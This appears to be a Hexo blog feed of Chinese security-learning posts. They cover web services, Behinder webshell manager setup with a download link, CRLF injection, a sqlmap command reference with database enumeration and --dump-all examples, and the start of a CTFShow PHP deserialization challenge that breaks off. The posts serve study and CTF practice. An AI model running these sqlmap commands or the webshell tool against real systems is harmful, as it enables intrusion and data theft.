Service的情况</strong></p><ol><li>跨越<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99/52767">防火墙</a>；</li><li>应用程序集成；</li><li><a href="https://baike.baidu.com/item/B2B">B2B</a>集成；</li><li>软件重用</li></ol><p><strong>不适合使用Web服务的情况</strong></p><ol><li>单机<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">应用程序</a>；</li><li><a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>上的同构应用程序</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈soap</title>
      <link href="/2022/05/18/%E6%B5%85%E8%B0%88soap/"/>
      <url>/2022/05/18/%E6%B5%85%E8%B0%88soap/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈SOAP"><a href="#浅谈SOAP" class="headerlink" title="浅谈SOAP"></a>浅谈SOAP</h1><img src="/2022/05/18/%E6%B5%85%E8%B0%88soap/1.png" class=""><img src="/2022/05/18/%E6%B5%85%E8%B0%88soap/2.png" class="">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>冰蝎</title>
      <link href="/2022/05/18/%E5%86%B0%E8%9D%8E/"/>
      <url>/2022/05/18/%E5%86%B0%E8%9D%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>Webshell管理工具，动态二进制加密网站客户端。流量动态加密，攻击特征安全设备（WAF、WebIDS）难以检测。</p><p>  冰蝎通信过程中使用AES（高级加密算法，对称加密，微信小程序使用此种方法）进行加密，Java和.NET默认支持AES，php中需要开启openssl扩展，在V2.0版本后，php环境方式根据服务端支持情况动态选择，使得冰蝎更强大，V3.0中使用预共享密钥，全程无明文交互，给waf、ids设备威胁狩猎带来挑战。</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>在这附上网盘链接：</p><p>链接：<a href="https://pan.baidu.com/s/1UdIhDjupoWHXyRQJINjXhA">https://pan.baidu.com/s/1UdIhDjupoWHXyRQJINjXhA</a><br>提取码：pass</p><p>将文件解压后直接点击Behinder.jar文件即可直接运行。</p><p>注：运行环境需要java8及以上。</p><h2 id="安装问题解决："><a href="#安装问题解决：" class="headerlink" title="安装问题解决："></a>安装问题解决：</h2><p>打不开的原因：冰蝎beta7版本客户端不再内置javafx库，java11以后版本移除了JavaFX库，要运行冰蝎需要自己下载JavaFX库。</p><p>那就是缺了一块javafx，下载就可以了</p><p>下载链接：<a href="https://gluonhq.com/products/javafx/">https://gluonhq.com/products/javafx/</a></p><p>选择适合的版本，比如我的是java11.0.12</p><img src="/2022/05/18/%E5%86%B0%E8%9D%8E/1.png" class=""><p>下载完之后记录一下lib文件的路径</p><p>然后在冰蝎的目录下新建一个txt文件。写入以下代码：（注意修改文件的路径）</p><p><code>start javaw --module-path &quot;E:\environment\javafx-sdk-11.0.2\lib&quot; --add-modules=javafx.base --add-modules=javafx.controls  --add-modules=javafx.fxml  --add-modules=javafx.graphics  --add-modules=javafx.media  --add-modules=javafx.swing  --add-modules=javafx.web -jar Behinder.jar</code></p><p>修改为start.bat，双击，即可打开冰蝎</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CRLF</title>
      <link href="/2022/05/16/CRLF/"/>
      <url>/2022/05/16/CRLF/</url>
      
        <content type="html"><![CDATA[<h1 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>CRLF的意思</p><p>就是回车(CR, ASCII 13, \r) 换行(LF, ASCII 10, \n)。</p><p>换行在有的<a href="https://baike.baidu.com/item/ASCII">ASCII</a>码表也用newline（简nl）来进行表示,这里的lf是line feed的概念，意思是一样的。</p><p>这两个ACSII字符不会在屏幕有任何输出，但在Windows中广泛使用来标识一行的结束。而在Linux/UNIX系统中只有换行符。</p><h3 id="CRLF命令"><a href="#CRLF命令" class="headerlink" title="CRLF命令"></a>CRLF命令</h3><table><thead><tr><th align="left">代码</th><th align="left">ASCII码</th><th align="left">符号</th><th align="left">概念</th></tr></thead><tbody><tr><td align="left">CR</td><td align="left">13</td><td align="left">\r</td><td align="left">光标移到行首</td></tr><tr><td align="left">LF</td><td align="left">10</td><td align="left">\n</td><td align="left">光标垂直移到下行</td></tr><tr><td align="left">CRLF</td><td align="left"></td><td align="left">%0d%0a</td><td align="left"></td></tr></tbody></table><p>注意:但是不同的操作系统行的结束符是不一样的,所以同一文件在不同操作系统中打开，内容格式可能会出现差异，这是行结束符不一致导致的。</p><ul><li>Windows：使用CRLF表示行的结束</li><li>Linux/Unix：使用LF表示行的结束</li><li>MacOS：早期使用CR表示，现在好像也用LF表示行的结束</li></ul><p>在HTTP规范中，行应该使用CRLF来结束。首部与主体由两个CRLF分隔，浏览器根据这两个CRLF来获取HTTP内容并显示。</p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>就是说黑客能够将CRLF命令注入到系统中。它不是系统或<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BD%AF%E4%BB%B6">服务器软件</a>的漏洞，而是网站应用开发时，有些开发者没有意识到此类攻击存在的可能而造成的。</p><p>针对这个漏洞黑客能够做什么？</p><p>就算黑客发现网站存在CRLF注入，他们仍然受到应用结构和这个缺陷的严重程度的限制。</p><p>对有些站点它将非常严重，而有些站点它只是很小的bug。</p><p>HTTP Header CRLF Injection</p><p>许多<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE">网络协议</a>，包括HTTP也使用CRLF来表示每一行的结束。这就意味着用户可以通过CRLF注入自定义HTTP header，导致用户可以不经过<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%B1%82">应用层</a>直接与Server对话。</p><p>HTTP header的定义就是基于这样的”Key: Value”的结构，用CRLF命令表示一行的结尾。</p><p>“Location:”头用来表示重定向的URL地址，”Set-Cookie:”头用来设置cookies。</p><p>如果用户的输入经过验证，其中存在CRLF的<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6">字符</a>就可以被用来达到欺骗的目的。</p><h4 id="CRLF漏洞原理"><a href="#CRLF漏洞原理" class="headerlink" title="CRLF漏洞原理"></a>CRLF漏洞原理</h4><p>描述：CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据输出在HTTP响应头中。（XSS一般输出在主体中） 所以CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。</p><p><em>原理1：找到输入点，构造恶意的CRLF字符</em> 描述:header可控的请求我们就可以尝试进行CRLF注入作为演示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#现在HTTP标头中的每一行都由CRLF分隔（如前所述，这是不可打印的ASCII字符）。</span><br><span class="line">#Request [CRLF]</span><br><span class="line">GET /test/demo.php?url=https://weiyigeek.github.io [CRLF]</span><br><span class="line">Host: 127.0.0.1 [CRLF]</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 [CRLF]</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 [CRLF]</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  [CRLF]</span><br><span class="line">Accept-Encoding: gzip, deflate [CRLF]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Response</span><br><span class="line">HTTP/1.1 200 OK [CRLF]</span><br><span class="line">Connection: keep-alive [CRLF]</span><br><span class="line">Content-Encoding: deflate [CRLF]</span><br><span class="line">Locations=https://weiyigeek.github.io [CRLF]</span><br></pre></td></tr></table></figure><p>抓包在请求行的url参数中加入特殊构造的CRLF字符,查看恶意数据是否在响应头中多了个Set-Cookie字段，如果证实了该系统存在CRLF注入漏洞就可以进行下一步；</p><img src="/2022/05/16/CRLF/1.png" class=""><p>具体请看 <a href="https://cloud.tencent.com/developer/article/1728657">https://cloud.tencent.com/developer/article/1728657</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用方法</title>
      <link href="/2022/05/16/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/05/16/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h1><pre><code>-h：帮助文档--version：查看sqlmap版本信息-v:显示详细信息   ·0：只显示python的错误和一些严重性的信息   ·1：显示基本信息（默认）   ·2：显示debug信息   ·3：显示注入过程的payload   ·4：显示http请求包   ·5：显示http响应头   ·6：显示http响应页面</code></pre><h1 id="Target（目标）"><a href="#Target（目标）" class="headerlink" title="Target（目标）"></a>Target（目标）</h1><p>-d：直接连接数据库（格式：‘mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME’）</p><p>-u：指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1</p><p>l：后面跟一个log文件，判断log（日志）文件中所有记录是否存在注入点（用于多个url）</p><p>m：后面跟一个txt文件，判断txt文件中所有记录是否存在注入点（用于多个url）</p><p>-r:检查post请求是否存在注入（可以通过抓包工具抓取包，把请求保存在一个文档中，不限制文档后缀）。</p><p>Request（请求）</p><ul><li><p>​      -‌-method：指定请求是提交的方法。如 –method=GET（ –method=POST）<br>注解：一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“–method”来指定方法。如：“–method=PUT”。<br>​    </p></li><li><p>​      -‌-data: 该参数指定的数据会以POST方式进行提交，Sqlmap也会检测该参数指定数据是否存在注入漏洞。（格式: –data = “参数1 &amp; 参数2…”）<br>注解：get/post提交的都适用（地址栏或者表单）；可以只提交一个参数。</p><p><code>python sqlmap.py -u “http://127.0.0.1/index.php” --data=”user=1&amp;pass=2”</code></p></li><li><p>-‌-param-del： 当用其他字符分割参数的时候，需要用到此参数（针对data）</p><p><code>python sqlmap.py -u &quot;http://127.0.0.1:8080/user.php&quot; --data=&quot;id=0;name=ner&quot; --param-del=&quot;;&quot;</code></p></li><li><p>-‌-user-agent: sqlmap默认的user-agent是sqlmap/1.5.11.5#dev (<a href="https://sqlmap.org)(这是我的),这样容易被目的主机所察觉,所以需要修改user-agent./">https://sqlmap.org)（这是我的），这样容易被目的主机所察觉，所以需要修改user-agent。</a></p><p> <code> python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;   --data=&quot;user = 1&quot;--user-agent=&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0&quot;</code></p></li></ul><p>​       注解：要检测user-agent的注入点，则需要level &gt;= 3。</p><ul><li><p>-‌-random-agent: user-agent可能不是特别容易记住，所以在安装目录\sqlmap-master\data\txt下有一个user-agents.txt文件，保存着大量的user-agent，而这个参数就是在这个文件中随机选择一个。</p><p><code> python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;   --data=&quot;user = 1&quot;  --random-agent</code></p></li><li><p>-‌-proxy: 用于代理</p><p><code> python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;   --proxy=&quot;http://127.0.0.1:8080&quot;</code></p></li><li><p>- -‌-proxy-cred:用于代理认证，个人感觉就是你让别人（代理商）做事情，别人想要收费，然后你缴费，别人给你一个账号和密码（用于认证），证明你可以让它为你做事情。（格式为：–proxy-cred=”name:password”） </p><p><code>python sqlmap.py -u http://127.0.0.1/123.asp?id=1 -proxy=127.0.0.1:8080 --proxy-cred=admin:pass</code></p></li><li><p>-‌-timeout:设置请求超时的时间，单位是秒，默认是30。（格式：-‌-timeout=50）</p></li><li><p>-‌-retries: 设置超时从新连接的次数，默认是3次。（格式： –retries=5）</p></li></ul><h1 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a>Injection（注入）</h1><ul><li> -p:对指定的参数进行检测（是否存在注入），这个会使level失效（这里失效的意思应该是只对p指定的参数进行检测，其他都不在进行检测了）。</li></ul><p>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;    -p &quot;user-agent&quot;</code></p><ul><li>-‌-skip:不对指定的参数进行检测（是否存在注入）。</li></ul><p>​    <code> python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;   --level=3  -skip &quot;user-agent&quot;</code></p><p>​      注解：当level &gt;= 3时，应该要检测user-agent参数，但使用了skip之后，sqlmap就不用再对 user- agent进行     检测了。（这里的level没有失效，除了指定的参数外，其他的还是要检测的）</p><ul><li><p>-‌-dbms: 指定数据库类型，无需sqlmap发出请求报文去确定数据库类型，减少请求次数和被察觉的概率。</p><p> <code> python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;   --dbms=&quot;mysql&quot;</code></p></li><li><p>-‌-os: 指定系统的信息，无需sqlmap发出请求报文去确定系统信息，减少请求次数和被察觉的概率。</p></li></ul><p>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;   --os=&quot;windows&quot;</code> </p><h1 id="Detection（检测）"><a href="#Detection（检测）" class="headerlink" title="Detection（检测）"></a>Detection（检测）</h1><ul><li>-‌-level: 设置测试的等级，一共有5级。<pre><code>      ·1：默认         ·2：检测cookie         ·3：检测user-agent         ·4：检测refere         ·5：检测host</code></pre></li></ul><p>#本人使用后看不出任何区别，用于给出格式<br><code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id=1&quot; --level 5</code></p><ul><li>-‌-risk: 设置风险等级，一共有4级。<pre><code>   ·1：默认（如果客户没有明确要求，使用等级1就好，因为等级越高，数据表被篡改的风险越大）   ·2：基于事件测试   ·3：基于or语句测试   ·4：会执行updata、delete等操作</code></pre></li></ul><p>#本人使用后看不出任何区别，用于给出格式<br>python sqlmap.py -u “<a href="http://sql.test/Less-1/?id=1&quot;">http://sql.test/Less-1/?id=1&quot;</a> –risk 3</p><ul><li>-‌-string: 基于布尔类型注入的时候，指定返回成功的信息，从而帮助sqlmap识别正确结果。（格式：-‌-string=‘内容’）</li></ul><p>#本人使用后看不出任何区别，用于给出格式<br><code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --string=&quot;win&quot;</code></p><ul><li>-‌-not-string: 基于布尔类型注入的时候，指定返回失败的信息，从而帮助sqlmap识别不正确结果。（格式：-‌-not-string=‘内容’）</li></ul><p>​       #本人使用后看不出任何区别，用于给出格式<br>​      <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --not-string=&quot;bad&quot;</code></p><ul><li>-‌-code: 若是用户知道代表True的页面HTTP状态码为200而代表False的页面HTTP状态码不为200比如是401的 话，就可以用“–code”参数告诉告诉Sqlmap这一信息（-‌-code=200）。</li></ul><p>​      #本人使用后看不出任何区别，用于给出格式<br>​      <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --code=200</code></p><ul><li>-‌-current-user: 获取当前用户。</li></ul><p>​       <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --current-user</code></p><ul><li>-‌-current-db： 获取当前的数据库。</li></ul><p>​        <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --current-db</code></p><ul><li>-‌-users: 获取所有用户。</li></ul><p>​        <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --users</code></p><ul><li>–dbs: 查看目标服务器有什么数据库。</li></ul><p>​        <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --dbs</code></p><ul><li>-‌-tables: 目标主机中的数据库有什么数据表。</li></ul><p>​        #默认是当前数据库<br>​        <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --tables</code><br>​        #查询目标主机information_schema的表信息<br>​        <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; -D &quot;information_schema&quot;  --tables</code></p><ul><li>-‌-columns: 获取目标主机中数据库的列数信息。</li></ul><p>​    #默认是当前数据库<br>​    <code>    python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --columns</code><br>​    #查询目标主机information_schema的列数信息<br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; -D &quot;information_schema&quot; --columns</code></p><ul><li>-‌-dump: 查询指定范围的所有数据（-D 指定数据库 -T 指定数据表 -C 指定字段）</li></ul><p>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;  --dump</code><br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; -T &quot;users&quot; --dump</code><br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;-D &quot;security&quot; -T &quot;users&quot; --dump</code><br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; -D &quot;lys&quot;  --dump</code></p><p>​    注解：默认是当前数据库的所有信息</p><ul><li>-‌-dump-all: 查询目的主机所有数据库的所有数据</li></ul><p>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --dump-all</code></p><ul><li>-‌-search: 查询目的主机是否存在相当应的列、表和数据库（-D 指定数据库 -T 指定数据表 -C 指定字段）</li></ul><p>​    #默认让sqlmap提供数据库名，是可以依靠securit查到security<br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --search -D &quot;securit&quot;</code><br>​    #查出在两个数据库中的两个users表<br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --search -T &quot;users&quot;</code><br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --search -C &quot;id&quot;</code></p><p>​    注解：search与dump不一样，如果不加-D -T -C的话，search是不会有效果的而dump会打印当前数据库的信    息。</p><ul><li>-‌-comments: 查询目的主机数据库的备注</li></ul><p>​    #本人使用后看不出任何区别，用于给出格式<br>​    #下面的应该是查询information_schema数据库<br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;  -D &quot;information_schema&quot; --comments</code><br>​    #下面的应该是查询当前数据库<br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot;   --comments</code></p><pre><code>-D: 指定数据库：与dump、search、comments等一起使用。-T: 指定数据表：与dump、search等一起使用。-C: 指定字段：与dump、search等一起使用。-‌-exclude-sysbds:排除系统数据库</code></pre><p>​    #与dbs（查看目标服务器有什么数据库）连用无效果<br>​    <code>python sqlmap.py -u &quot;http://sql.test/Less-1/?id= 1&quot; --dump-all --exclude-sysdbs</code></p><p>转载自： 月生ψ </p><p>原文链接：<a href="https://blog.csdn.net/weixin_46962006/article/details/121307150">https://blog.csdn.net/weixin_46962006/article/details/121307150</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow web入门 PHP反序列化</title>
      <link href="/2022/05/13/CTFShow-web%E5%85%A5%E9%97%A8-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/05/13/CTFShow-web%E5%85%A5%E9%97%A8-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p>查看一下源代码：            </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;<span class="comment">//判断传入的username与password是否与类内的变量一致</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span 